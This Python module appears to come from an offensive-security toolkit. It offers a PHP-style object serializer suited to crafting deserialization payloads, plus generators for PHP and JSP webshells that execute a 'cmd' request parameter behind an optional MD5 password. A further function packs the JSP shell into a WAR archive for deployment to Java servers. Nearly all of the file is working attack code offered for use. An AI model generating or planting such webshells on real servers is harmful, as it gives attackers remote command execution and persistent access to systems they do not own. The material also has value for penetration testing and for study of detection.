from inspect import getmembers, isroutine
from random import randint
import hashlib
from pathlib import Path
from subprocess import call


__all__ = [
    "randnum", "phpserialize", "phpwebshell", "jspwebshell", "warwebshell"
]


def randnum(length: int) -> str:
    """Generate random number of certain length.
    It can generate numbers starting with 0.

    Args:
        lenght (int): length of the number to generate
        
    Returns:
        int: genreate
    """
    return "".join([str(randint(0, 9)) for _ in range(0, length)])


def phpserialize(obj, null_byte: str = "\0") -> str:
    """Serialize object like in php

    Args:
        obj: Object to serialize

    Keywords:
        null_byte (str): Null byte definition (object serialization only)

    Returns:
        str: serialize object
    """
    if isinstance(obj, type(None)):
        return "N;"
    if isinstance(obj, bool):
        return f"b:{int(obj)};"
    if isinstance(obj, int):
        return f"i:{obj};"
    if isinstance(obj, float):
        return f"d:{obj};"
    if isinstance(obj, str):
        return f"s:{len(obj)}:\"{obj}\";"
    if isinstance(obj, dict):
        s = "".join(
            [f"{phpserialize(k)}{phpserialize(v)}" for k, v in obj.items()] 
        )
        return s.join([f"a:{len(obj)}:{{", "}"])
    if isinstance(obj, (list, tuple, set)):
        s = "".join(
            [f"{phpserialize(i)}{phpserialize(v)}" for i, v in enumerate(obj)]
        )
        return s.join([f"a:{len(obj)}:{{", "}"])
    if isinstance(obj, object):
        #: Class attributes
        attrs = getmembers(obj, lambda a:not(isroutine(a)))
        # Keep defined attributes
        attrs = [
            a for a in attrs 
            if not(a[0].startswith('__') and a[0].endswith('__'))
        ]
        # Reverse attribute order
        attrs.reverse()

        s = ""
        n = obj.__class__.__name__
        for k, v in attrs:
            nk = k
            # Attribute is private
            if k.startswith(f"_{n}__"):
                nk = "".join([null_byte, n, null_byte, k[len(f"_{n}__"):]])              
            # Attribute is protected
            elif k.startswith("_"):
                nk = "".join([null_byte, "*", null_byte, k[1:]])

            
            s = phpserialize(nk).join([s, phpserialize(v)])
            
        return s.join([f"O:{len(n)}:\"{n}\":{len(attrs)}:{{", "}"])


def phpwebshell(password: str = "", command="echo shell_exec") -> str:
    """Generate a PHP webshell

    Webshell parameters:
        cmd: command to execute
        pwd: required password (if set)

    Kewords:
        password (str): webshell password

    Returns:
        str: webshell content
    """
    shell = (
        f"if (isset($_REQUEST[\"cmd\"])) {command}($_REQUEST[\"cmd\"]);"
    )

    if password:
        _hash = hashlib.md5(password.encode('utf-8')).hexdigest()
        
        shell = shell.join(
            [
                "if (isset($_REQUEST[\"pwd\"]) && md5($_REQUEST[\"pwd\"]) "
                f"=== \"{_hash}\") {{ ",
                " }"
            ]
        )
    return shell.join(["<?php ", " ?>"])


def jspwebshell(password: str = "") -> str:
    """Generate a JSP webshell

    Keywords:
        password (str): webshell password

    Returns:
        str: webshell content
    """
    header = (
        "<%@page import=\"java.util.*,java.io.*,"
        "java.security.MessageDigest\"%><% "
    )

    shell = (
        "if (request.getParameter(\"cmd\") != null) {" 
        "Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));"
        "DataInputStream dis = new DataInputStream(p.getInputStream());"
        "String disr = dis.readLine();"
        "while(disr != null){out.println(disr);disr = dis.readLine();}"
        "p.destroy();"
        "}"
    )
    if password:
        _hash = hashlib.md5(password.encode('utf-8')).hexdigest()

        check = (
            "if (request.getParameter(\"pwd\") != null) {"
            "String pwd = request.getParameter(\"pwd\");"
            "MessageDigest mdAlgorithm = MessageDigest.getInstance(\"MD5\");"
            "mdAlgorithm.update(pwd.getBytes());"
            "byte[] digest = mdAlgorithm.digest();"
            "StringBuffer hexString = new StringBuffer();"
            "for (int i = 0; i < digest.length; i++) {"
            "pwd = Integer.toHexString(0xFF & digest[i]);"
            "if (pwd.length() < 2) { pwd = \"0\" + pwd; }"
            "hexString.append(pwd); }"
            f"if (hexString.toString().equals(\"{_hash}\")) {{"
        )

        shell = shell.join([check, "} }"])

    return shell.join([header, "%>"]).replace("\n", "").strip()

def warwebshell(path: str = "shell.war", password: str = ""):
    """Create a webshel into war archive
    
    Args:
        path (str): Path to create war including name
            (e.g. /home/user/shell.war)
    """
    p = Path(path)
    
    jsp = p.parents[0] / "index.jsp"

    with open(jsp, "w")as f:
        f.write(jspwebshell(password=password))

    call(["jar", "-cf", p.name, "index.jsp"])
    call(["rm", jsp])